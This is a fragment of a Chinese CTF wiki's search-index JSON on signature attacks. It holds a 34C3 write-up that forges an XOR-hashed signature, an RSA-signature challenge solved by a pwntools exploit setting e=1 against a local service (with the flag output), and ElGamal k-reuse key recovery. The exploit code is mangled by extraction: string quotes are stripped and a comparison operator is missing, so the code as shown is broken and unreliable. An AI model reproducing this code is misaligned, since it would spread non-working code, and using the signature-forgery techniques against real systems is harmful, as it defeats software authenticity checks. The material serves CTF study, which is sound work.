            "text": "\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u662f\u4e0a\u4f20\u4e00\u4e2a zip \u538b\u7f29\u5305\uff0c\u7136\u540e\u5bf9 signed_data \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fdb\u884c\u7b7e\u540d\u9a8c\u8bc1\u3002\u5176\u4e2d\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u624b\u6cd5\u662f\u5927\u6982\u662f\u5c06\u6bcf\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c sha256 \u54c8\u5e0c\uff0c\u7136\u540e \u5f02\u6216 \u8d77\u6765\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 rsa \u8fdb\u884c\u7b7e\u540d\u3002\u5982\u679c\u901a\u8fc7\u9a8c\u8bc1\u7684\u8bdd\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684 pre-copy.py \u548c post-copy.py \u6587\u4ef6\u3002  \u5f88\u81ea\u7136\u7684\u60f3\u6cd5\u662f\u6211\u4eec\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\uff0c\u7136\u540e\u518d\u6b21\u7ed5\u8fc7\u7b7e\u540d\u5373\u53ef\u3002\u4e3b\u8981\u6709\u4e24\u79cd\u601d\u8def   \u6839\u636e\u7ed9\u5b9a\u7684\u516c\u94a5\u6587\u4ef6\u83b7\u53d6\u5bf9\u5e94\u7684\u79c1\u94a5\uff0c\u8fdb\u800c\u518d\u4fee\u6539\u6587\u4ef6\u540e\u4f2a\u9020\u7b7e\u540d\uff0c\u7136\u540e\u5927\u6982\u770b\u4e86\u770b\u516c\u94a5\u6587\u4ef6\u51e0\u4e4e\u4e0d\u53ef\u7834\uff0c\u6240\u4ee5\u8fd9\u4e00\u70b9\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u653e\u5f03\u3002  \u4fee\u6539\u5bf9\u5e94\u6587\u4ef6\u540e\uff0c\u5229\u7528 \u5f02\u6216\u7684\u7279\u6027\u4f7f\u5f97\u5176\u54c8\u5e0c\u503c\u4ecd\u7136\u4e0e\u539f\u6765\u76f8\u540c \uff0c\u4ece\u800c\u7ed5\u8fc7\u7b7e\u540d\u68c0\u6d4b\u3002\u5373\u4f7f\u5f97 signed_data \u76ee\u5f55\u4e0b\u5305\u542b\u591a\u4e2a\u6587\u4ef6\uff0c\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\u6700\u540e\u5f02\u6216\u8d77\u6765\u53ef\u4ee5\u62b5\u6d88\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py\u6587\u4ef6\u6240\u9020\u6210\u7684\u54c8\u5e0c\u503c\u7684\u4e0d\u540c\u3002   \u8fd9\u91cc\uff0c\u6211\u4eec\u9009\u62e9\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u5177\u4f53\u601d\u8def\u5982\u4e0b   \u8ba1\u7b97 pre-copy.py \u7684\u539f hash \u503c\u3002  \u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u8ba1\u7b97\u65b0\u7684 hash \u503c\u3002\u5c06\u4e24\u8005\u5f02\u6216\uff0c\u6c42\u5f97\u5f02\u6216\u5dee\u503c delta\u3002  \u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u6587\u4ef6\uff0c\u4f7f\u5176 hash \u503c\u5f02\u6216\u8d77\u6765\u6b63\u597d\u4e3a delta\u3002   \u5173\u952e\u7684\u6b65\u9aa4\u5728\u4e8e\u7b2c\u4e09\u6b65\uff0c\u800c\u5176\u5b9e\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u4e2a\u7ebf\u6027\u7ec4\u5408\u7684\u95ee\u9898\uff0c\u5373\u5bfb\u627e\u82e5\u5e72\u4e2a 256 \u7ef401\u5411\u91cf\u4f7f\u5176\u5f02\u6216\u503c\u4e3a delta\u3002\u800c \n$$\n(F={0,1},F^{256},\\oplus ,\\cdot)\n$$\n\u662f\u4e00\u4e2a 256 \u7ef4\u7684\u5411\u91cf\u7a7a\u95f4\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u8be5\u5411\u91cf\u7a7a\u95f4\u7684\u4e00\u4e2a\u57fa\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6c42\u5f97\u8be5\u7a7a\u95f4\u4e2d\u4efb\u610f\u6307\u5b9a\u503c\u7684\u6240\u9700\u8981\u7684\u5411\u91cf\u3002  \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 sage \u6765\u8f85\u52a9\u6211\u4eec\u6c42\uff0c\u5982\u4e0b  # generage the base of  {0,1},F^256,xor,*  def   gen_gf2_256_base (): \n     v   =   VectorSpace ( GF ( 2 ),   256 ) \n     tmphash   =   compute_file_hash ( 0.py ,   ) \n     tmphash_bin   =   hash2bin ( tmphash ) \n     base   =   [ tmphash_bin ] \n     filelist   =   [ 0.py ] \n     print   base \n     s   =   v . subspace ( base ) \n     dim   =   s . dimension () \n     cnt   =   1 \n     while   dim   !=   256 : \n         tmpfile   =   str ( cnt )   +   .py \n         tmphash   =   compute_file_hash ( tmpfile ,   ) \n         tmphash_bin   =   hash2bin ( tmphash ) \n         old_dim   =   dim \n         s   =   v . subspace ( base   +   [ tmphash_bin ]) \n         dim   =   s . dimension () \n         if   dim     old_dim : \n             base   +=   [ tmphash_bin ] \n             filelist . append ( tmpfile ) \n             print ( dimension    +   str ( s . dimension ())) \n         cnt   +=   1 \n         print ( cnt ) \n     m   =   matrix ( GF ( 2 ),   256 ,   256 ,   base ) \n     m   =   m . transpose () \n     return   m ,   filelist   \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u7b54\uff0c\u8bf7\u53c2\u8003  exp.py \u3002  \u8fd9\u91cc\u6211\u4fee\u6539 pre-copy \u591a\u8f93\u51fa   !!!!come here!!!!  \u5b57\u773c\uff0c\u5982\u4e0b  \u279c  software_update git: ( master )  python3 installer.py now.zip\nPreparing to copy data...\n!!!!come here!!!!\nSoftware update installed successfully.", 
            "title": "2017 34c3 Software_update"
        }, 
        {
            "location": "/crypto/hash/complex/#_2", 
            "text": "https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme  https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/crypto/signature/introduction/", 
            "text": "\u6570\u5b57\u7b7e\u540d\n\n\n\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\uff0c\u6211\u4eec\u5728\u53c2\u52a0\u67d0\u4e2a\u6d3b\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u7b7e\u540d\uff0c\u4ee5\u4fbf\u4e8e\u8bc1\u660e\u6211\u4eec\u786e\u5b9e\u5230\u573a\u4e86\uff0c\uff0c\uff0c\u9632\u6b62\u5bfc\u5458\u5565\u7684\uff0c\u4f60\u61c2\u5f97\u3002\u3002\u3002\u4f46\u5176\u5b9e\u5427\uff0c\u8fd9\u79cd\u7b7e\u540d\u5f88\u5bb9\u6613\u88ab\u4f2a\u9020\uff0c\u968f\u4fbf\u627e\u4e00\u4e2a\u4eba\u4ee3\u7b7e\u4e00\u4e0b\uff0c\u6216\u8005\u8bf4\u627e\u4e00\u4e2a\u4f1a\u6a21\u4eff\u522b\u4eba\u5b57\u8ff9\u7684\u4eba\u5e2e\u5fd9\u7b7e\u4e00\u4e0b\u3002\u5728\u8ba1\u7b97\u673a\u4e16\u754c\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9700\u8981\u7535\u5b50\u7b7e\u540d\uff0c\u56e0\u4e3a\u6211\u4eec\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528\u7535\u5b50\u6587\u4ef6\uff0c\u90a3\u8fd9\u65f6\u5019\u600e\u4e48\u529e\u5462\uff1f\u5f53\u7136\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u81ea\u5df1\u7684\u540d\u5b57\u3002\u4f46\u5176\u5b9e\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u90a3\u5c31\u662f\u91c7\u7528\u6570\u5b57\u7b7e\u540d\uff0c\u8fd9\u79cd\u7b7e\u540d\u66f4\u52a0\u96be\u4ee5\u4f2a\u9020\uff0c\u53ef\u4fe1\u7a0b\u5ea6\u66f4\u9ad8\u3002\u6570\u5b57\u7b7e\u540d\u7684\u4e3b\u8981\u7528\u5904\u662f\u786e\u4fdd\u6d88\u606f\u786e\u5b9e\u6765\u81ea\u4e8e\u58f0\u79f0\u4ea7\u751f\u8be5\u6d88\u606f\u7684\u4eba\u3002\n\n\n\u6570\u5b57\u7b7e\u540d\u4f9d\u8d56\u4e8e\u975e\u5bf9\u79f0\u5bc6\u7801\uff0c\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u4e00\u65b9\u80fd\u591f\u505a\u7684\u4e8b\u60c5\uff0c\u800c\u53e6\u4e00\u65b9\u4e0d\u80fd\u591f\u505a\u51fa\u8fd9\u6837\u7684\u4e8b\u60c5\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b", 
            "title": "\u6570\u5b57\u7b7e\u540d\u7b80\u4ecb"
        }, 
        {
            "location": "/crypto/signature/introduction/#_1", 
            "text": "\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\uff0c\u6211\u4eec\u5728\u53c2\u52a0\u67d0\u4e2a\u6d3b\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u7b7e\u540d\uff0c\u4ee5\u4fbf\u4e8e\u8bc1\u660e\u6211\u4eec\u786e\u5b9e\u5230\u573a\u4e86\uff0c\uff0c\uff0c\u9632\u6b62\u5bfc\u5458\u5565\u7684\uff0c\u4f60\u61c2\u5f97\u3002\u3002\u3002\u4f46\u5176\u5b9e\u5427\uff0c\u8fd9\u79cd\u7b7e\u540d\u5f88\u5bb9\u6613\u88ab\u4f2a\u9020\uff0c\u968f\u4fbf\u627e\u4e00\u4e2a\u4eba\u4ee3\u7b7e\u4e00\u4e0b\uff0c\u6216\u8005\u8bf4\u627e\u4e00\u4e2a\u4f1a\u6a21\u4eff\u522b\u4eba\u5b57\u8ff9\u7684\u4eba\u5e2e\u5fd9\u7b7e\u4e00\u4e0b\u3002\u5728\u8ba1\u7b97\u673a\u4e16\u754c\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9700\u8981\u7535\u5b50\u7b7e\u540d\uff0c\u56e0\u4e3a\u6211\u4eec\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528\u7535\u5b50\u6587\u4ef6\uff0c\u90a3\u8fd9\u65f6\u5019\u600e\u4e48\u529e\u5462\uff1f\u5f53\u7136\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u81ea\u5df1\u7684\u540d\u5b57\u3002\u4f46\u5176\u5b9e\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u90a3\u5c31\u662f\u91c7\u7528\u6570\u5b57\u7b7e\u540d\uff0c\u8fd9\u79cd\u7b7e\u540d\u66f4\u52a0\u96be\u4ee5\u4f2a\u9020\uff0c\u53ef\u4fe1\u7a0b\u5ea6\u66f4\u9ad8\u3002\u6570\u5b57\u7b7e\u540d\u7684\u4e3b\u8981\u7528\u5904\u662f\u786e\u4fdd\u6d88\u606f\u786e\u5b9e\u6765\u81ea\u4e8e\u58f0\u79f0\u4ea7\u751f\u8be5\u6d88\u606f\u7684\u4eba\u3002  \u6570\u5b57\u7b7e\u540d\u4f9d\u8d56\u4e8e\u975e\u5bf9\u79f0\u5bc6\u7801\uff0c\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u4e00\u65b9\u80fd\u591f\u505a\u7684\u4e8b\u60c5\uff0c\u800c\u53e6\u4e00\u65b9\u4e0d\u80fd\u591f\u505a\u51fa\u8fd9\u6837\u7684\u4e8b\u60c5\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b", 
            "title": "\u6570\u5b57\u7b7e\u540d"
        }, 
        {
            "location": "/crypto/signature/rsa/", 
            "text": "RSA \u6570\u5b57\u7b7e\u540d\n\n\n\u539f\u7406\n\n\n\u539f\u7406\u7c7b\u4f3c\u4e8e RSA \u52a0\u5bc6\uff0c\u53ea\u662f\u8fd9\u91cc\u4f7f\u7528\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u5c06\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4f5c\u4e3a\u7b7e\u540d\u3002\n\n\n2018 Backdoor Awesome mix1\n\n\n\u9996\u5148\uff0c\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u6e90\u7801\uff0c\u8fd9\u91cc\u7a0b\u5e8f\u4f7f\u7528 PKCS1_V1.5 \u8fdb\u884c\u4e86 RSA \u7b7e\u540d\uff0c\u8fd9\u4f1a\u5bf9\u660e\u6587\u6d88\u606f\u8fdb\u884c\u6269\u5c55\uff0c\u5177\u4f53\u6269\u5c55\u89c4\u5219\u8bf7\u53c2\u8003 \nhttps://www.emc.com/collateral/white-papers/h11300-pkcs-1v2-2-rsa-cryptography-standard-wp.pdf\n \u3002\u8fd9\u91cc\u7ed9\u51fa\u5bf9\u5e94\u6269\u5c55\u811a\u672c\uff0c\u5bf9\u5e94\u4e8e\u9898\u76ee\u4e2d\u7684 \nfrom Util import PKCS1_pad as pad\n \n\n\ndef\n \nPKCS1_pad\n(\ndata\n):\n\n    \nasn1\n \n=\n \n3021300906052b0e03021a05000414\n\n    \nans\n \n=\n \nasn1\n \n+\n \ndata\n\n    \nn\n \n=\n \nlen\n(\nans\n)\n\n    \nreturn\n \nint\n((\n00\n \n+\n \n01\n \n+\n \nff\n \n*\n \n(\n1024\n \n/\n \n8\n \n-\n \nn\n \n/\n \n2\n \n-\n \n3\n)\n \n+\n \n00\n \n+\n \nans\n),\n \n16\n)\n\n\n\n\n\n\u7a0b\u5e8f\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa \nn,e\n \u4f7f\u5f97\u7a0b\u5e8f\u6ee1\u8db3 \n\n\nh(m)^e mod \\ n=pad(m)\nh(m)^e mod \\ n=pad(m)\n\n\n\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 \nh(m)\uff0cpad(m)\n\u3002\u663e\u7136\u5982\u679c\u6211\u4eec\u63a7\u5236 \ne=1\n\u7684\u8bdd\uff0c\u90a3\u4e48\n\n\nh(m)-pad(m)=kn\nh(m)-pad(m)=kn\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e k=1\uff0c\u65e2\u53ef\u4ee5\u5f97\u5230 n\u3002\n\n\n\u672c\u5730\u90e8\u7f72 \nsocat TCP4-LISTEN:12345,fork EXEC:./mix1.py\n\u3002\n\n\nexp \u5982\u4e0b\n\n\nfrom\n \nCrypto.Hash\n \nimport\n \nSHA\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nfrom\n \nUtil\n \nimport\n \nPKCS1_pad\n\n\n\n#context.log_level = \ndebug\n\n\n\n\ndef\n \nmain\n():\n\n    \nport\n \n=\n \n12345\n\n    \nhost\n \n=\n \n127.0.0.1\n\n    \np\n \n=\n \nremote\n(\nhost\n,\n \nport\n)\n\n    \np\n.\nrecvuntil\n(\nMessage   -\n \n)\n\n    \nmessage\n \n=\n \np\n.\nrecvuntil\n(\n\\n\\n\nSignature -\n \n,\n \ndrop\n=\nTrue\n)\n\n    \nlog\n.\ninfo\n(\nmessage: \n \n+\n \nmessage\n)\n\n    \nsignature\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n    \nlog\n.\ninfo\n(\nsignature: \n \n+\n \nsignature\n)\n\n\n    \nh\n \n=\n \nSHA\n.\nnew\n(\nmessage\n)\n\n\n    \nm\n \n=\n \nPKCS1_pad\n(\nh\n.\nhexdigest\n())\n\n\n    \ne\n \n=\n \n1\n\n    \nn\n \n=\n \nint\n(\nsignature\n,\n \n16\n)\n \n-\n \nm\n\n\n    \np\n.\nsendlineafter\n(\nEnter n:\n,\n \nstr\n(\nn\n))\n\n    \np\n.\nsendlineafter\n(\nEnter e:\n,\n \nstr\n(\ne\n))\n\n\n    \np\n.\ninteractive\n()\n\n\n\n\nmain\n()\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\n\n\n\u279c  \n2018\n-BackdoorCTF-Awesome-mix1 git:\n(\nmaster\n)\n python exp.py\n\n[\n+\n]\n Opening connection to \n127\n.0.0.1 on port \n12345\n: Done\n\n[\n*\n]\n message: super important information \nfor\n admin only\n\n[\n*\n]\n signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f\n\n[\n*\n]\n Switching to interactive mode\nCTF\n{\ncryp70_5ur3_15_w13rd\n}\n\n\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\n2018 Backdoor Awesome mix2\n\n\n\u5f85\u7eed\u3002", 
            "title": "RSA \u6570\u5b57\u7b7e\u540d"
        }, 
        {
            "location": "/crypto/signature/rsa/#rsa", 
            "text": "", 
            "title": "RSA \u6570\u5b57\u7b7e\u540d"
        }, 
        {
            "location": "/crypto/signature/rsa/#_1", 
            "text": "\u539f\u7406\u7c7b\u4f3c\u4e8e RSA \u52a0\u5bc6\uff0c\u53ea\u662f\u8fd9\u91cc\u4f7f\u7528\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u5c06\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4f5c\u4e3a\u7b7e\u540d\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/signature/rsa/#2018-backdoor-awesome-mix1", 
            "text": "\u9996\u5148\uff0c\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u6e90\u7801\uff0c\u8fd9\u91cc\u7a0b\u5e8f\u4f7f\u7528 PKCS1_V1.5 \u8fdb\u884c\u4e86 RSA \u7b7e\u540d\uff0c\u8fd9\u4f1a\u5bf9\u660e\u6587\u6d88\u606f\u8fdb\u884c\u6269\u5c55\uff0c\u5177\u4f53\u6269\u5c55\u89c4\u5219\u8bf7\u53c2\u8003  https://www.emc.com/collateral/white-papers/h11300-pkcs-1v2-2-rsa-cryptography-standard-wp.pdf  \u3002\u8fd9\u91cc\u7ed9\u51fa\u5bf9\u5e94\u6269\u5c55\u811a\u672c\uff0c\u5bf9\u5e94\u4e8e\u9898\u76ee\u4e2d\u7684  from Util import PKCS1_pad as pad    def   PKCS1_pad ( data ): \n     asn1   =   3021300906052b0e03021a05000414 \n     ans   =   asn1   +   data \n     n   =   len ( ans ) \n     return   int (( 00   +   01   +   ff   *   ( 1024   /   8   -   n   /   2   -   3 )   +   00   +   ans ),   16 )   \u7a0b\u5e8f\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa  n,e  \u4f7f\u5f97\u7a0b\u5e8f\u6ee1\u8db3   h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m)  \u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053  h(m)\uff0cpad(m) \u3002\u663e\u7136\u5982\u679c\u6211\u4eec\u63a7\u5236  e=1 \u7684\u8bdd\uff0c\u90a3\u4e48  h(m)-pad(m)=kn h(m)-pad(m)=kn  \u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e k=1\uff0c\u65e2\u53ef\u4ee5\u5f97\u5230 n\u3002  \u672c\u5730\u90e8\u7f72  socat TCP4-LISTEN:12345,fork EXEC:./mix1.py \u3002  exp \u5982\u4e0b  from   Crypto.Hash   import   SHA  from   pwn   import   *  from   Util   import   PKCS1_pad  #context.log_level =  debug  def   main (): \n     port   =   12345 \n     host   =   127.0.0.1 \n     p   =   remote ( host ,   port ) \n     p . recvuntil ( Message   -   ) \n     message   =   p . recvuntil ( \\n\\n Signature -   ,   drop = True ) \n     log . info ( message:    +   message ) \n     signature   =   p . recvuntil ( \\n ,   drop = True ) \n     log . info ( signature:    +   signature ) \n\n     h   =   SHA . new ( message ) \n\n     m   =   PKCS1_pad ( h . hexdigest ()) \n\n     e   =   1 \n     n   =   int ( signature ,   16 )   -   m \n\n     p . sendlineafter ( Enter n: ,   str ( n )) \n     p . sendlineafter ( Enter e: ,   str ( e )) \n\n     p . interactive ()  main ()   \u6548\u679c\u5982\u4e0b  \u279c   2018 -BackdoorCTF-Awesome-mix1 git: ( master )  python exp.py [ + ]  Opening connection to  127 .0.0.1 on port  12345 : Done [ * ]  message: super important information  for  admin only [ * ]  signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f [ * ]  Switching to interactive mode\nCTF { cryp70_5ur3_15_w13rd }  [ * ]  Got EOF  while  reading in interactive", 
            "title": "2018 Backdoor Awesome mix1"
        }, 
        {
            "location": "/crypto/signature/rsa/#2018-backdoor-awesome-mix2", 
            "text": "\u5f85\u7eed\u3002", 
            "title": "2018 Backdoor Awesome mix2"
        }, 
        {
            "location": "/crypto/signature/elgamal/", 
            "text": "ElGamal\n\n\nRSA\u7684\u6570\u5b57\u7b7e\u540d\u65b9\u6848\u51e0\u4e4e\u4e0e\u5176\u52a0\u5bc6\u65b9\u6848\u5b8c\u5168\u4e00\u81f4\uff0c\u53ea\u662f\u5229\u7528\u79c1\u94a5\u8fdb\u884c\u4e86\u7b7e\u540d\u3002\u4f46\u662f\uff0c\u5bf9\u4e8eElGamal\u6765\u8bf4\uff0c\u5176\u7b7e\u540d\u65b9\u6848\u4e0e\u76f8\u5e94\u7684\u52a0\u5bc6\u65b9\u6848\u5177\u6709\u5f88\u5927\u533a\u522b\u3002\n\n\n\u57fa\u672c\u539f\u7406\n\n\n\u5bc6\u94a5\u751f\u6210\n\n\n\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b\n\n\n\n\n\u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff08\u5341\u8fdb\u5236\u4f4d\u6570\u4e0d\u4f4e\u4e8e160\uff09\uff0c\u4ee5\u4fbf\u4e8e\u5728\nZ_p\nZ_p\n \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002\n\n\n\u9009\u53d6\nZ_p^*\nZ_p^*\n \u7684\u751f\u6210\u5143g\u3002\n\n\n\u968f\u673a\u9009\u53d6\u6574\u6570d,\n0\\leq d \\leq p-2\n0\\leq d \\leq p-2\n \uff0c\u5e76\u8ba1\u7b97\ng^d \\equiv y \\bmod p\ng^d \\equiv y \\bmod p\n \u3002\n\n\n\n\n\u5176\u4e2d\u79c1\u94a5\u4e3a{d}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002\n\n\n\u7b7e\u540d\n\n\nA\u9009\u53d6\u968f\u673a\u6570\nk \\in Z_{p-1}\nk \\in Z_{p-1}\n \uff0c\u5e76\u4e14gcd(k,p-1)=1\uff0c\u5bf9\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\n\n\n$ sig_d(m,k)=(r,s)$ \n\n\n\u5176\u4e2d\nr \\equiv g^k \\bmod p\nr \\equiv g^k \\bmod p\n \uff0c\ns \\equiv (m-dr)k^{-1} \\bmod p-1\ns \\equiv (m-dr)k^{-1} \\bmod p-1\n \u3002\n\n\n\u9a8c\u8bc1\n\n\n\u5982\u679c \ng^m \\equiv y^rr^s \\bmod p\ng^m \\equiv y^rr^s \\bmod p\n \uff0c\u90a3\u4e48\u9a8c\u8bc1\u6210\u529f\uff0c\u5426\u5219\u9a8c\u8bc1\u5931\u8d25\u3002\u8fd9\u91cc\u9a8c\u8bc1\u6210\u529f\u7684\u539f\u7406\u5982\u4e0b\uff0c\u9996\u5148\u6211\u4eec\u6709\n\n\n\n\n\ny^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks}\n\n\n\n\ny^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks}\n\n\n\n\n\n\u53c8\u56e0\u4e3a\n\n\n\n\n\ns \\equiv (m-dr)k^{-1} \\bmod p-1\n\n\n\n\ns \\equiv (m-dr)k^{-1} \\bmod p-1\n\n\n\n\n\n\u6240\u4ee5\n\n\n\n\n\nks \\equiv m-dr \\bmod p-1\n\n\n\n\nks \\equiv m-dr \\bmod p-1\n\n\n\n\n\n\u8fdb\u800c\n\n\n\n\n\nks+dr=a*(p-1)+m\n\n\n\n\nks+dr=a*(p-1)+m\n\n\n\n\n\n\u6240\u4ee5\n\n\n\n\n\ng^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m\n\n\n\n\ng^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m\n\n\n\n\n\n\u6240\u4ee5\u6839\u636e\u8d39\u9a6c\u5b9a\u7406\uff0c\u53ef\u5f97\n\n\n\n\n\ng^{ks+dr} \\equiv g^m \\bmod p\n\n\n\n\ng^{ks+dr} \\equiv g^m \\bmod p\n\n\n\n\n\n\u96be\u70b9\n\n\n\u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86r,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684k\u3002\n\n\n\u5e38\u89c1\u653b\u51fb\n\n\np\u592a\u5c0f\n\n\n\u968f\u673a\u6570k\u590d\u7528\n\n\n\u539f\u7406\n\n\n\u5982\u679c\u7b7e\u540d\u8005\u590d\u7528\u4e86\u968f\u673a\u6570k\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u5730\u8ba1\u7b97\u51fa\u79c1\u94a5\u3002\u5177\u4f53\u7684\u539f\u7406\u5982\u4e0b\uff1a\n\n\n\u5047\u8bbe\u76ee\u524d\u6709\u4e24\u4e2a\u7b7e\u540d\u90fd\u662f\u4f7f\u7528\u540c\u4e00\u4e2a\u968f\u673a\u6570\u8fdb\u884c\u7b7e\u540d\u7684\u3002\u90a3\u4e48\u6211\u4eec\u6709\n\n\n\n\n\nr \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1\n\n\n\n\nr \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1\n\n\n\n\n\n\u8fdb\u800c\u6709\n\n\n\n\n\ns_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1\n\n\n\n\ns_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1\n\n\n\n\n\n\u4e24\u5f0f\u76f8\u51cf\n\n\n\n\n\nk(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1\n\n\n\n\nk(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1\n\n\n\n\n\n\u8fd9\u91cc\uff0c\ns_1,s_2,m_1,m_2,p-1\ns_1,s_2,m_1,m_2,p-1\n \u5747\u5df2\u77e5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7b97\u51fak\u3002\u5f53\u7136\uff0c\u5982\u679c\ngcd(s_1-s_2,p-1)!=1\ngcd(s_1-s_2,p-1)!=1\n \u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u591a\u4e2a\u89e3\uff0c\u8fd9\u65f6\u6211\u4eec\u53ea\u9700\u8981\u591a\u8bd5\u4e00\u8bd5\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636es\u7684\u8ba1\u7b97\u65b9\u6cd5\u5f97\u5230\u79c1\u94a5d\uff0c\u5982\u4e0b\n\n\n\n\n\nd \\equiv \\frac{m-ks}{r}\n\n\n\n\nd \\equiv \\frac{m-ks}{r}\n\n\n\n\n\n\u9898\u76ee\n\n\n2016 LCTF Crypto 